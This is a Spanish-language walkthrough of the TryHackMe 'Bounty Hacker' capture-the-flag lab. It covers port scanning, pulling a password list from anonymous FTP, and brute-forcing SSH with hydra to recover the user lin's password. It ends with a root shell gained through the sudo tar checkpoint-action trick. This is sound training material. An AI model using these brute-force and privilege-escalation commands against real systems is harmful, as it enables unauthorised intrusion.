# Bounty Hacker - TryHackMe

## Recnocimiento

Vamos a realizar un escaneo con nmap para ver los puertos abiertos de la máquina:

```bash
sudo nmap -sS --open -p- --min-rate 5000 -Pn -vvv -n 10.129.134.255

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 62
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62
```

Veamos las versiones de los servicios y ejecutemos scripts de NSE:

```bash
nmap -sCV -p21,22,80 10.129.134.255

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.132.12
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 26:a1:8d:a0:8a:b8:d6:37:d9:2d:14:5a:3b:bb:34:55 (RSA)
|   256 02:45:da:80:48:e9:8d:ac:9e:a4:f1:ee:a3:57:fa:33 (ECDSA)
|_  256 6a:0c:c1:21:65:2a:92:26:83:43:42:55:97:49:45:aa (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Nos metemos al ftp anonimo y descargamos los archivos:

```bash
ftp 10.129.134.255

get locks.txt
get task.txt
```

```bash
cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

```bash
cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

Realizamos una enumeración de directorios a http://10.129.134.255 mediante gobuster:

```bash
gobuster dir -u "http://10.129.134.255" -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20 --exclude-length 10701

images               (Status: 301) [Size: 317] [--> http://10.129.134.255/images/]
index.html           (Status: 200) [Size: 969]
javascript           (Status: 301) [Size: 321] [--> http://10.129.134.255/javascript/]
```

## Explotación

Si probamos fuerza bruta por ssh al usuario vicious no nos descubre nada:

```bash
hydra -l vicious -P ./locks.txt ssh://10.129.134.255 -t 4
```

Si probamos con el usuario lin encontramos las siguintes credenciales:

```bash
hydra -l lin -P ./locks.txt ssh://10.129.134.255 -t 4

[22][ssh] host: 10.129.134.255   login: lin   password: RedDr4gonSynd1cat3
```

## Escalada de privilegios

Si ejecutamos `sudo -l` vemos lo siguiente:

```bash
User lin may run the following commands on ip-10-129-134-255:                                                       
    (root) /bin/tar 
```

Buscamos en GTFObins: https://gtfobins.org/gtfobins/tar/#shell

```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

root@ip-10-129-134-255:~# id                                                                                        
uid=0(root) gid=0(root) groups=0(root)                                                                              
```

Y completamos el lab.